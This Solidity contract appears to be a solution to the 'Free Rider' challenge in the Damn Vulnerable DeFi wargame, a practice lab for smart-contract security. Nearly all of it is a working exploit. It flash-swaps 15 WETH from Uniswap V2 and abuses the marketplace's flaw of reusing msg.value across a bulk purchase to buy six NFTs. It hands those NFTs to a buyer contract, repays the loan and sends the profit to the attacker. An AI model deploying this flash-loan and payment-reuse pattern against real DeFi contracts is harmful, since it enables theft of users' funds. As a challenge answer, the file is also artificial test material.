// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttacker is IERC721Receiver {
    address payable private weth;
    IUniswapV2Pair private uniswapV2Pair;
    address private factoryV2;
    FreeRiderNFTMarketplace private nftMarketPlace;
    FreeRiderBuyer private freeRiderBuyer;
    DamnValuableNFT private damnValuableNft;

    function attack(
        address _factoryV2,
        address payable _weth,
        address _uniswapV2Pair,
        address payable _nftMarketPlace,
        address _freeRiderBuyer,
        address _damnValuableNft
    ) external payable
    {
        factoryV2 = _factoryV2;
        weth = _weth;
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        nftMarketPlace = FreeRiderNFTMarketplace(_nftMarketPlace);
        freeRiderBuyer = FreeRiderBuyer(_freeRiderBuyer);
        damnValuableNft = DamnValuableNFT(_damnValuableNft);

        // Let's flash swap 15 weth
        console.log("Flashing...");
        uniswapV2Pair.swap(15 ether, 0, address(this), "0x01");

        console.log("Sending %s ether to attacker", address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external
    {
        // Make sure it's the uniswap factory invoking the callback
        _validateCaller(amount0);

        // Get ETH for WETH
        withdrawFromWeth(amount0);

        // Buy and transfer the NFTs
        uint256[] memory buys = new uint256[](6);
        buys[0] = 0;
        buys[1] = 1;
        buys[2] = 2;
        buys[3] = 3;
        buys[4] = 4;
        buys[5] = 5;
        nftMarketPlace.buyMany{value: 15 ether}(buys);

        for (uint256 i = 0; i < 6; ++i) {
            damnValuableNft.safeTransferFrom(address(this), address(freeRiderBuyer), uint256(i));
        }

        // Make the swap whole
        uint256 amountToReturn = amount0 * 1000 / 997 + 1;
        depositToWeth(amountToReturn);
        transferWeth(amountToReturn);
    }

    function _validateCaller(uint256 amount) internal view {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        require(token0 == address(weth), "Expected first token to be WETH");
        require(
            msg.sender == IUniswapV2Factory(factoryV2).getPair(token0, token1),
            "Caller isn't a UniswapV2 pair"
        );
    }

    function depositToWeth(uint256 amount) internal {
        (bool success,) = weth.call{value: amount}(abi.encodeWithSignature("deposit()"));
        require(success, "weth deposit failed :(");
    }

    function withdrawFromWeth(uint256 amount) internal {
        console.log("Withdrawing from WETH start");
        (bool success,) = weth.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, "weth withdraw failed :(");
        console.log("Withdrawing from WETH end");
    }

    function transferWeth(uint256 amount) internal {
        (bool success,) = weth.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, amount));
        require(success, "weth transfer failed :(");
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        pure
        override
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}